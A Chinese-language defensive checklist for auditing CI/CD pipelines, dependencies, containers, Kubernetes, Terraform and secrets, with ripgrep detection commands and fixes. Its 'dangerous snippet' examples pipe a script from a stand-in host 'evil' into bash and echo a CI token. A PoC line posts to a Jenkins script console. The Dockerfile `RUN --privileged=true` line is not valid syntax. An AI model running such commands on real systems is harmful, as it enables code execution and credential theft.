# 供应链 / CI-CD / 容器 / IaC / 密钥安全

> 覆盖 CI/CD 脚本、依赖供应链、容器/K8s/Terraform、密钥管理的高危检测清单

## 高危攻击面
- CI/CD 脚本执行 `curl|bash`、下载未校验、外部触发器可控、长存活秘钥
- 依赖供应链：typosquatting、dependency confusion、本地/私有 registry 混用、postinstall hook
- 容器：特权/hostPath/hostNetwork、USER root、敏感挂载、未固定基础镜像
- K8s：过宽 RBAC、`system:masters` 绑定、`default` SA 挂载、`hostPath`/`privileged`、Ingress header 漏洞
- Terraform/IaC：明文密钥、0.0.0.0/0 入站、S3 bucket 公开、RDS 未加密
- Secrets：硬编码密钥、`.env`/配置泄露、JWK/SSH 私钥、缓存/日志泄露

## 检测清单
- [ ] CI/CD: GitHub Actions/GitLab/Jenkins 是否存在 `curl ... | sh`、`GITHUB_TOKEN` 权限过大、仓库触发器可写
- [ ] 依赖：是否使用私有 registry；`package.json`/`requirements.txt` 是否 pin 版本；是否存在 `postinstall` 执行脚本
- [ ] 容器：Dockerfile `USER root`、`--privileged`、`hostNetwork`、`hostPath`、未锁定 tag（latest）
- [ ] K8s：`cluster-admin` 角色绑定、ServiceAccount 自动挂载、`allowPrivilegeEscalation` true、Ingress 未校验 Host/Path
- [ ] IaC：0.0.0.0/0、未开启加密、未启用版本化、未限制公共访问
- [ ] Secrets：`password|secret|token|access_key|private_key` 出现在代码/配置/CI

## 检测命令
```bash
# CI/CD 脚本
rg -n "curl .*\\| ?bash|sh -c|powershell -Command" .github .gitlab-ci.yml Jenkinsfile
rg -n "GITHUB_TOKEN|CI_JOB_TOKEN|AWS_ACCESS_KEY|AKIA" .github .gitlab-ci.yml Jenkinsfile

# 依赖/脚本钩子
rg -n "postinstall|preinstall|install" package.json
rg -n "dependency" package.json pnpm-lock.yaml package-lock.json

# Docker/K8s/IaC
rg -n "privileged: true|hostNetwork: true|hostPath:" --glob "*.{yml,yaml}"
rg -n "USER root|--privileged" --glob "*Dockerfile*"
rg -n "0\\.0\\.0\\.0/0" --glob "*.{tf,yml,yaml}"
rg -n "aws_access_key|aws_secret_key|BEGIN RSA PRIVATE KEY|BEGIN OPENSSH PRIVATE KEY" --glob "*"
```

## 高置信最短验证
- CI/CD：找可写触发器（PR、pipeline 变量）、检查是否能执行任意脚本；验证 token 权限（最小权限原则）。
- 依赖：检查私有域名/作用域是否解析；尝试识别未 pin 的依赖（“^”/“~”/latest）。
- 容器/K8s：确认 `USER` 非 root，禁用 `privileged/hostPath`；RBAC 是否最小化；Ingress/Service 只暴露必要端口。
- Secrets：确认密钥不在 repo/镜像层；使用密钥管理服务；日志/缓存不落盘密钥。

## 最小 PoC 示例
```bash
# GitHub Actions 任意命令探测
grep -n "run: curl .*| bash" .github/workflows/*.yml

# Jenkins 可写 Job（未鉴权脚本）
curl -s -u user:pass "http://jenkins/script" -d 'script=println "pwn"'

# Dockerfile 特权检查
grep -n "USER root\|--privileged" **/Dockerfile

# K8s RBAC/特权
kubectl get clusterrolebindings | grep cluster-admin
rg -n "privileged: true|hostNetwork: true|hostPath:" --glob "*.{yml,yaml}"

# Secrets 泄露
rg -n "BEGIN RSA PRIVATE KEY|aws_secret_key|AKIA" .
```

## 典型危险片段
```yaml
# GitHub Actions: 触发即执行远程脚本
on: pull_request
jobs:
  build:
    steps:
      - run: curl http://evil/p.sh | bash
      - run: echo "${{ secrets.GITHUB_TOKEN }}"  # 默认 token 具备写权限（建议最小权限 PAT）
```

```groovy
// Jenkins pipeline: 未限制分支/PR
node {
  sh "curl http://evil/p.sh | bash"
}
```

```Dockerfile
FROM ubuntu:latest
USER root                # ❌ root
RUN --privileged=true    # ❌ 特权
```

## 修复基线
- CI/CD：固定哈希/签名下载；最小权限 token；受控触发；禁用任意 `curl|bash`
- 依赖：锁定版本；私有 registry；审计 postinstall；启用签名/完整性校验
- 容器：非 root 用户；只读根文件系统；禁用特权；最小化能力；固定基础镜像版本
- K8s：关闭默认 SA 挂载；最小 RBAC；禁止 `hostPath`/`privileged`；入口网关做 Host/Path 严格匹配
- IaC：限制 0.0.0.0/0；启用加密与版本化；关闭公共访问；密钥用 KMS/Secrets Manager
- Secrets：集中化密钥管理，扫描与阻断泄露，轮换与最小可见性
